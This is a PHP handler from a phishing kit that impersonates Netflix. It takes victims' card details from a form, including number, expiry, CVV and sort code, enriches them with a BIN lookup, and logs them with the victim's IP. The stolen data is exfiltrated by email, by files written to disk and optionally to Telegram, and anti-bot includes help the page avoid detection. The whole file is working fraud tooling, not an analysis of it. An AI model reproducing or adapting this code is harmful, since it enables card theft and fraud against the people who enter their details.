<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include '../autob/bts2.php';
include '../req/config.php';

function getcardtype($cardnumber){
$cardtype = array(
    '34'=>'American Express',
    '37'=>'American Express',
    '5'=>'Master Card',
    '4'=>'Visa',
    '30'=>'Blue Card',
	'36'=>'Blue Card',
    '38'=>'Blue Card',
    '35'=>'JCB',
    '6'=>'Discover');
if(substr($cardnumber,0,2) == "34"){return   $cardtype[34];}
else if(substr($cardnumber,0,2) == "37"){return  $cardtype[37];}
else if(substr($cardnumber,0,2)== "30"){return  $cardtype[30];}
else if(substr($cardnumber,0,2)== "36"){return  $cardtype[36];}
else if(substr($cardnumber,0,2)== "38"){return   $cardtype[38];}
else if(substr($cardnumber,0,2)== "35"){return  $cardtype[35];}
else if(substr($cardnumber,0,1)== "6"){return   $cardtype[6];}
else if(substr($cardnumber,0,1)== "5"){return   $cardtype[5];}
else if(substr($cardnumber,0,1) == "4"){return  $cardtype[4];}
else {return "Unknown";};
};

function getcd($cardnumber){
$ctype = getcardtype($cardnumber);
$cd=str_replace(' ','',$cardnumber);
$bin=substr($cd,0,6);
$getdetails = "https://lookup.binlist.net/".$bin;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details=json_decode($content,true);
$narr=array('scheme'=>$ctype,'type'=>'Unknown','brand'=>'Unknown','bank'=>array('name'=>'Unknown',),'country'=>array('name'=>'Unknown'));
foreach($details as $key => $value){$narr[$key]=$value;};
return $narr;
};

if(isset($_POST['hsub']) && isset($_POST['cardname']) && isset($_POST['cardnumber']) && isset($_POST['expdate'])){
if(strlen($_POST['cardnumber']) > 12){
	$cardname = $_POST['cardname'];
	$cardnumber = $_POST['cardnumber'];
	$expdate = $_POST['expdate'];
	$cvv = $_POST['cvv'];
	$sort_code = $_POST['sort_code'] ?$_POST['sort_code']:'';
	$PublicIP = $_SERVER['REMOTE_ADDR'];
	$cd=getcd($cardnumber);
	$bank=strtoupper($cd['bank']['name'])." | ".$cd['country']['name'];
	$type=strtoupper($cd['scheme']." - ".$cd['type']);
	$level=strtoupper($cd['brand']);
	$Info_LOG = "
|------------------ CARD DETAILS -----------------|
Bank Info        : $bank
Type             : $type
Level            : $level
Name On Card     : $cardname
Card Number      : $cardnumber
Expiry date      : $expdate
CVV              : $cvv
Sort Code        : $sort_code ";
		$_SESSION['fullz'].=$Info_LOG; 
		$_SESSION['cardtype']=$cardtype; 
$Info_LOG.='
'.$PublicIP;

// Don't Touche
//Email
        if($Send_Email == 1 ){
            $subject = '♥♥ Netf1ix CARD Details ♥♥ '.$PublicIP ;$headers = 'From: YoCHI <yochnetf@yochnet.com>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
		};
//FTP == 1 save result >< == 0 don't save result
        if($Ftp_Write == 1 ){
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		header("location:except?y=".md5(rand(100, 999999999))."&amp");
    }
	else{header("location:wallet?".$theerrkey."=bc&dised=".md5('nasdklssimkddz')."");};
}
else{header("location:wallet?".$theerrkey."=1&ded=".md5('nasalklksimdz')."");};
?>